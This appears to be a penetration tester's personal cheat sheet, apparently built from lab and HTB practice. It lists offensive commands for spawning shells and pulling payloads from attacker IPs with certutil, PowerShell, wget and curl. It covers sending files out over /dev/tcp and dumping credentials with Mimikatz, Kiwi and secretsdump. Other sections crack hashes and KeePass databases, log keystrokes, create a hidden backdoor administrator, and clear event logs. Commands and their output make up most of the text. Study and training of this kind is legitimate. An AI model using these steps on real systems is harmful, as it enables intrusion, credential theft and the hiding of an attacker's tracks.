###### Spawn TTY Shell

```
python -c 'import pty; pty.spawn("/bin/sh")'
ctrl+z
stty raw -echo;fg
export TERM=xterm
stty rows 28 cols 110    (check row and col using command - "stty -a")
```
```
python -c 'import pty; pty.spawn("/bin/bash")'

ctrl+z

stty raw -echo;fg
```

- `echo os.system('/bin/bash')`

- `/bin/sh -i`

        
### [PAYLOAD TRANSFER TECHNIQUES](#)



###### Netcat

simply using cat, when using linux both side
```
cat test.jar > /dev/tcp/10.10.14.8/9001             # from target

nc -nlvp 90001 > test.jar                           # to attacker machine
```
using nc.exe in case of windows
```
nc -nv 10.5.19.93 1234 < test.txt                    # from attacker machine

nc.exe -nlvp 1234 > test.txt                         # to target
```

###### HTTP Server

Start HTTP Server on kali
```
service apache2 start

python -m SimpleHTTPServer 80`

python -m http.server 80 `
```
Fetch file on target
```
# Windows certutil
certutil -urlcache -f http://10.10.19.3/payload.exe payload.exe

# Windows Powershell
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')

Invoke-WebRequest http://10.50.47.247/SharpHound.exe -OutFile SharpHound.exe

#Linux
wget http://10.17.107.227/exploit.c -P /tmp/

# Linux/Windows
curl -O http://10.50.138.14/nmap`

```

###### FTP Server

Start FTP Server on kali using pyftpdlib (sudo apt-get install pure-ftpd)
```
python -m pyftpdlib -p 21
```
Fetch file by connecting to FTP server
```
ftp IP
get <filname>
```
The trick is to create a file with all the FTP commands we need, and run it all at once

###### SMB Server
```
# Starting SMB Server on kali

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .  

# Fetching file from kali

copy \\10.17.107.227\kali\reverse.exe C:\PrivEsc\reverse.exe

# Fetching file to kali

copy 20250314223129_BloodHound.zip \\10.10.16.3\kali\20250314223129_BloodHound.zip
```




###### SSH SCP (Secure Copy Protocol)
- SSH File transfer using linux `SCP`(Secure Copy Protocol)
    - Requirement - SSH credentials
        - From Local to Remote (kali to compromised)
            - Syntex
                - `scp [file_name]  remoteuser@remotehost:/remote/directory`
            - example
                - `scp test.txt jayesh@10.143.90.2:/home/jayesh`
            - To Non standard SSH port (when our SSH server is listening on a non-standard port.)
                - Syntex
                    - `scp -P port source_file user@hostname:destination_file`
                - example
                    - `scp -P 2222 test2.txt jayesh@10.143.90.2:/home/jayesh/`
        - From Remote machine to local (compromised to kali)
            - Syntex
                -`scp user@remotehost:/home/user/file_name .`
            - example
                - `scp jayesh@10.143.90.2:/home/jayesh/test1.txt .`
                - `scp sian.gill@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/sian.gill/20240418155122_BloodHound.zip .`
        - From Remote Host to Another Remote Host
            - Syntex
                - `scp user@remotehost:/home/user/file_name user2@remotehost2.com:/remote/directory`

##### TRANSFER OPTIONS WHEN YOU ARE PIVOTED
Evil-weinrm is better option in case you have it open.
###### Evil-winrm
- Uploading via WinRM CLI
    - upload and download
    - `evil-winrm -i '10.200.141.150' -u 'sam' -p 'Cayde@123'` > *Evil-WinRM* PS C:\Users\sam> `mkdir Temp`
        - *Evil-WinRM* PS C:\Users\sam> `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\Users\sam\Temp\mimi.exe`
        - *Evil-WinRM* PS C:\Users\Administrator\Temp> `upload /home/kali/Downloads/chisel C:\Users\Administrator\Temp\chisel.exe`
    - Conversely, we can use download REMOTE_FILEPATH LOCAL_FILEPATH to download files back from the target.

    - Script Loader feature from evil-winrm (-s flag)
        - `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150 -s /usr/share/windows-resources/powersploit/Recon/` > *Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan.ps1`

###### RDP
- Accessing file via RDP from kali with `/drive` option
    - Let’s you share a directory from Attack Machine to Target Machine GUI.
    - Example we share mimikatx directory
        - `xfreerdp /v:10.200.141.150 /u:sam /p:Cayde@123 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz,share`
            - C:\Windows\system32>`\\tsclient\share\x64\mimikatz.exe` 



### Connect To Services

#### MySQL
```
mysql -u <username> -p
```
![alt text](/ss/image.png)

More comnands
```
use <dbname>

shwo tables

describe <tablename>

select X, Y from <tablename>
```

#### Postgres

**psql**

[Postgres Enumeration](https://hacktricks.boitatech.com.br/pentesting/pentesting-postgresql)
```
psql -h <hostname or ip address> -p <port number of remote machine> -d <database name which you want to connect> -U <username of the database server>
```
![alt text](/ss/postgres.png)
### Hash Identification

- Linux hashes in /etc/passwd based on diffrent crypt schemes

    - Traditional DES based scheme (Default Password Encryption algorithm)
        - `Kyq4bCxAXJkbg`

    - BSDI extended DES Scheme
        - `_EQ0.jzhSVeUyoSqLupI`

    - MD5-based scheme
        - `$1$etNnh7FA$OlM7eljE/B7F1J4XYNnk81`

    - Bcrypt - Blowfish-based scheme
        - Hashes starts with `$2$, $2a$, $2b$, $2x$ or $2y$ `depending on which variant of the algorithm is used
            - Example - `$2a$10$VIhIOofSMqgdGlL4wzE//e.77dAQGqntF/1dT7bqCrVtquInWy2qi`

    - NT Hash based scheme
        - `$3$$8846f7eaee8fb117ad06bdd830b7586c`

    - SHAcrypt - SHA-2 (SHA-256 and SHA-512) based schem
        - H ashes starts with `$5$ (for SHA-256) or $6$ (for SHA-512)` depending on which SHA variant is used
            - SHA-256 - `$5$9ks3nNEqv31FX.F$gdEoLFsCRsn/WRN3wxUnzfeZLoooVlzeF4WjLomTRFD`
            - SHA-512 - `$6$qoE2letU$wWPRl.PVczjzeMVgjiA8LLy2nOyZbf7Amj3qLIL978o18gbMySdKZ7uepq9tmMQXxyTIrS12Pln.2Q/6Xscao0`

    - Scrypt - Password Based Key Derivate Function (PBKFD) based scheme
        - `$7$DU..../....2Q9obwLhin8qvQl6sisAO/$sHayJj/JBdcuD4lJ1AxiwCo9e5XSi8TcINcmyID12i8`

    - Scrypt+SHA256 based scheme
        - `$8$mTj4RZG8N9ZDOk$elY/asfm8kD3iDmkBe3hD2r4xcA/0oWS5V3os.O91u.`

    - Yescrypt
        - `$y$j9T$F5Jx5fExrKuPp53xLKQ..1$X3DX6M94c7o.9agCG9G317fhZg9SqC.5i5rd.RhAtQ7`

- Windows NTLM hash
    - `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::`
    - It is combination of NT and LM hash, LM hash is same for all users on system
        - NT Hash - `e3c61a68f1b89ee6c8ba9507378dc88d`
        - LM Hash - `aad3b435b51404eeaad3b435b51404ee`

### Linux password hash generation

- OpenSSL
    ```
    student@attackdefense:~$ `openssl passwd -1 -salt abc password123`
    $1$abc$UWUoROXzUCsLsVzI0R2et.
    ```
- mkpasswd
    ```
    ┌──(kali㉿kali)-[~]
    └─$ `mkpasswd -m sha-512 newpasswordhere`
    $6$oTvKrJiKZIcu/MLj$q8t7Ip.Plc4rfdRjyUlL9bEx2loeDcROEHph.syr/7.56YGKAPUMNkMQpavEbGo7T3nt/XXZDsuAiz7DlVFpQ.
    ```

### Hash Dumping

#### Mimikatz

- Uploading and using Mimikatz executable with meterpreter
    - Migrating to `LSASS` process
        - `pgrep lsass` > `migrate 788`
    - Upload mimikatz executable
        - `mkdir temp` > `cd temp` > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
    - Run mimikatxz executable
        - ` shell` > `.\mimikatz.exe ` 
        - Confirm that you have elevated privileges that mimikatz requires and elevate our integrity to SYSTEM level.
            - `privilege::debug` > `token::elevate`
        - Dump the SAM database hashes
            - `lsadump::sam`

- Using Mimikatz executable
    - Upload executable using suitable technique
    - Run executabel and check for provileges for '20' OK
        - `mimikatz.exe` > `privilege::debug `
    - Possible attacks
        - Dump Logonpaswords of users stored in memeory of users logged in after last boot
            - mimikatz # `sekurlsa::logonpasswords `
        - Dump SAM which includes hashes of all users
            - mimikatz # `lsadump::sam `
            - mimikatz # `lsadump::sam /patch `
        - Dump hashes of users from LSA
            - mimikatz # `lsadump::lsa /patch `
        - Dump password hashes from the NTDS.DIT file without need to authenticating domain controller
            - mimikatz # `lsadump::dcsync /domain:controller.local /all /csv`

#### Active Directory
##### Secretsdump.py
- This will extract all of the usernames and their NT hashes
    - `secretsdump.py -ntds ntds.nit -system system.hive LOCAL | tee hash_dump.txt`

#### Linux
- Manually - `cat /etc/shadow`
- Metasploit -  `post/linux/gather/hashdump`

#### Meterpreter Kiwi

- Metasploit 
    - Using inbuilt meterpreter extension `Kiwi`
        - Migrating to `LSASS` process
            - `pgrep lsass` > `migrate 788`
        - load and run kiwi
            - `load kiwi` > `creds_all` > `lsa_dump_sam`

    - Dumping hashes using meterpreter `hashdump`
        - `hashdump`

#### Secretsdump.py
```
# This will extract all of the usernames and their NT hashes
# you might need to locate this on kali
# note - system registry hive contains the keys needed to decrypt the NTDS file

python3 secretsdump.py -ntds ntds.nit -system system.hive LOCAL | tee hash_dump.txt

```
```
# Another example of SeBackupPrivilege

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite
*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
*Evil-WinRM* PS C:\tmp> download ntds.dit
*Evil-WinRM* PS C:\tmp> download system

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL

```

### CRACK PASSWORDS

#### John
```
john --wordlist=/home/kali/rockyou.txt crackme.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=rockyou.txt hash.txt
```

##### zip2john
```
# Use zip2john to access password protected zip, it creates a crackable hash of password which we can crack by john

zip2john winrm_backup.zip > winrm_backup.hash

# Note the hashcat cant crack such hash we can only use john for this

john  --wordlist=~/Downloads/rockyou.txt  winrm_backup.hash 

```

##### pfx2john

A .pfx file typically represents the PKCS#12 format, containing both a public and private key for a user. if you can get access to this file, you’ll be able to get a shell over WinRM or other.

[This post](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) shows the openssl commands to extract the private key and certificate (public key) from a .pfx file.
```
openssl pkcs12 -in [yourfile.pfx] -nocerts -out [drlive.key]
```

However in our case we are prompted for a password
```
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Mac verify error: invalid password?
```
We can use `pfx2john.py` to generate a hash for this which John can crack
```
pfx2john legacyy_dev_auth.pfx > pfx.hash
```
```
john  --wordlist=~/Downloads/rockyou.txt  pfx.hash 
```
Enter the password and a passphrase which you can remember
```
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```
Dump the certificate
```
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
```
Now both files exist
```
└─$ ls legacyy_dev_auth.*
legacyy_dev_auth.crt  legacyy_dev_auth.key  legacyy_dev_auth.pfx
```
Now we can use this public key Certificate and the private Key with Winrm to get shell
```
# -S - Enable SSL, because I’m connecting to 5986;
# -c legacyy_dev_auth.crt - provide the public key certificate
# -k legacyy_dev_auth.key - provide the private key
# -i timelapse.htb - host to connect to

evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```
##### Keypass2John

https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html#crack-master-password

```
PS C:\Users\kohsuke\Documents> ls


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx 
```

That’s a KeePass database, a local password manager. (https://keepass.info/)

With KeePass, to get things out of the database, we need the master password. I’ll use the keepass2john script to create a hash the represents the password:

```
oxdf@hacky$ keepass2john CEH.kdbx 
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
oxdf@hacky$ keepass2john CEH.kdbx > CEH.kdbx.hash
```
I’ll use hashcat to crack it. I’ll need the --user flag as the hash starts with [username]:. hashcat now can automatically detect the hash type (most of the time), and it works here:
```
$ hashcat CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
...[snip]...
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
...[snip]...
```
I’ll use kpcli to extract passwords from the KeePass database. To connect, I just give it the kdb file and enter the master password when prompted:
```
oxdf@hacky$ kpcli --kdb CEH.kdbx

# find . will list all the passwords:

kpcli:/> find .
Searching for "." ...
 - 8 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com


# show -f [num] will print each of those passwords:

kpcli:/> show -f 0

 Path: /CEH/
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/> show -f 1

 Path: /CEH/
Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/> show -f 2

 Path: /CEH/
Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/> show -f 3

 Path: /CEH/
Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/> show -f 4

 Path: /CEH/
Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/> show -f 5

 Path: /CEH/
Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/> show -f 6

 Path: /CEH/
Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/> show -f 7

 Path: /CEH/
Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on


```
#### Hashcat 
```
hashcat -m 0 -a 0 md5.txt rockyou.txt
hashcat -m 13100  -a 0 kerberoshash ~/Downloads/rockyou.txt

# (note -hashcat automatically detects mode if not provided)

hashcat hash.kerb ~/Downloads/rockyou.txt 

hashcat hashes -m0 ~/Downloads/rockyou.txt --force --show

# Password Safe V3 database - https://0xdf.gitlab.io/2025/04/19/htb-administrator.html#access-password-safe

hashcat -m 5200 Backup.psafe3 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 

```

#### Unshadow
```
unshadow passwd.txt shadow.txt > crackme.txt
```

#### Crackstation.net/

https://crackstation.net/

#### (vncpwd) Crack TightVNC Password

https://0xdf.gitlab.io/2020/07/25/htb-cascade.html#crack-tightvnc-password

We found this line while enumeration in a VNC Install.reg

 "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f 

[Download , Compile and use](https://github.com/jeroennijhof/vncpwd)

```
└─$ echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
└─$ git clone https://github.com/jeroennijhof/vncpwd.git
└─$ gcc -o vncpwdd vncpwd/vncpwd.c vncpwd/d3des.c
└─$ file vncpwdd
vncpwdd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0b2bfd9f75563acbfea09b55c1d008a48174c91d, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CrackPassword/vncpwd]
└─$ ./vncpwdd ../../SMB/vnc_enc_pass
Password: sT333ve2

```


### ENCRYPTION & DECRYPTION

#### GNU Privacy Guard (GPG or gpg)
- Encrypting (need to give password in prompt)- `gpg -c file1.txt `
- Hiding/renaming - ` mv file1.txt.gpg critical_data.doc`
- Decrypting (using password in prompt)- `gpg -d critical_data.doc `
- Decrypting without password
    - Bruteforce using John
        - Convert encryted file to hash
            - `gpg2john [encrypted gpg file] > [filename of the hash you want to create]`
        - Brute force using John
            - `john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]`


#### OpenSSL
- Encrypt file
    - `openssl aes-256-cbc -e -in message.txt -out encrypted_message`
- Decrypt file
    - `openssl aes-256-cbc -d -in encrypted_message -out original_message.txt`
- Encryption more secure and resilient against brute-force attacks
    - use the Password-Based Key Derivation Function 2 (PBKDF2)
        - `openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message`
    - Decryption 
        - `openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`

#### gpp-decrypt
This tool is written in Python 3 to parse the Group Policy Preferences XML file which extracts the username and decrypts the cpassword attribute.
```
python3 gpp-decrypt.py cpassword

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ 
```

### [METERPRETER](#)

- Windows Enumeration
    - `sysinfo`, `getuid`, `getpid`, `getprivs`, `ps`, `pgrep <process_name>`, `shell`

- Migrating to other process
    - `ps` > `pgrep <process name>` > `migrate <pid>`

- Checking current privileges
    - `getprivs`

- Windows Privilege Escalation
    - `getsystem`

- Starting shell on system
    - `shell`

- Keylogging
    - `keyscan_start`, `keyscan_dump`

- Adding route to other network for pivoting
    - `run autoroute -s <subnet>/20`

- Portforwarding
    - `portfwd add -l 1234 -p 80 -r 10.5.31.52`

- Hashdumping 
    - Using Mimikatz meterpreter extension
        - `pgrep lsass` > `migrate 788` > `load kiwi` > `creds_all` > `lsa_dump_sam`
    - Using Hashdump
        - `hashdump`

- Create a Backdoor user, enable rdp for it, also hide it from login screen and add it to Remote Desktop Users and Administrators groups
    - `run getgui -e -u user123 -p hacker_123321`

- Clear windows Event Log
    - `clearev`

NOTE - There is more advanced need to be checked from 
https://fuzzysecurity.com/tutorials/16.html, 
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#internet-settings